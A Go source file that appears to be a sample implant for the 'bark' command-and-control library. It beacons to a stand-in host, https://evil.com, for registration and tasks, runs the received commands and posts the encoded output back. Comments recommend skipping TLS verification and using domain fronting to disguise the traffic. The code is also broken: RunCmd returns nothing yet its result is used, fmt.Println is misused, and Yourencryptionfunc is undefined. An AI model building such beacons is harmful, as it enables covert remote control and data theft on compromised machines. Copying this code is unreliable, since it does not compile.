package main

import (
	"encoding/base64"
	"fmt"
	"time"

	"github.com/salukikit/bark"
)

func RunCmd(cmd string) {

	output := fmt.Println(cmd)

}

func YourDecryptFunc(respbody []byte) (string, bool) {
	return string(respbody), true

}

func YourEncryptfunc(output []byte) (string, bool) {
	return base64.StdEncoding.EncodeToString(output), true

}

func main() {

	var reg bool
	var verifycert bool
	verifycert = false

	/*
		The next line creates a simple default http transport, with tls verify skipped.
		Both NewBarkerQUIC and NewBarkerHTTP just create an easy default *BarkerConfig, you can manually specify everything yourself with your own *BarkerConfig.
	*/
	httpconf := bark.NewBarkerHTTP("mynewhttpcomms", verifycert)

	//root url should include the protocol, e.g. http:// or https://
	// For now Bark doesn't handle what urls/sets of urls to use etc, that is down to you. However, you can set items like the host header via http.config.

	rooturl := "https://evil.com"

	/*
		You can also manually specify Transport config etc via the httpconf.tr like so:

			httpconf.tr = &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
					ServerName: "cloudfront.com",
				},
				Proxy:           http.ProxyFromEnvironment,
			}
		This can be useful for things like domain fronting, where you might need to manually specify the SNI header, or if you have really specific TLS needs.
	*/

	//Then update our barker with our new settings.
	bark.UpdateBarkers("mynewhttpcomms", httpconf)

	// registration command loop

	for !reg {
		resp, err := bark.Beacon("mynewhttpcomms", rooturl)
		if err != nil {
			time.Sleep(1000)
			return
		}

		//do your decryption/verification, maybe get some fancy new urls after registering, it's all up to you!
		ua, ok := YourDecryptFunc(resp)
		if ok {
			//Registered! Below could be a way of updating the user-agent or whatever you like with a new user-agent.
			httpconf.Ua = ua
			bark.UpdateBarkers("mynewhttpcomms", httpconf)
			reg = true
		}

	}

	//Now we start the beacon loop
	for {

		beaconurl := rooturl + "/tasks"

		encCmd, err := bark.Beacon("mynewhttpcomms", beaconurl)
		if err != nil {
			time.Sleep(1000)
			return
		}
		cmd, ok := YourDecryptFunc(encCmd)
		if ok {
			//Command is good, run command
			output := RunCmd(cmd)
			encdata := Yourencryptionfunc(output)
			bark.Postout("mynewhttpcomms", rooturl, encdata)

		}
		time.Sleep(1000)
	}
}
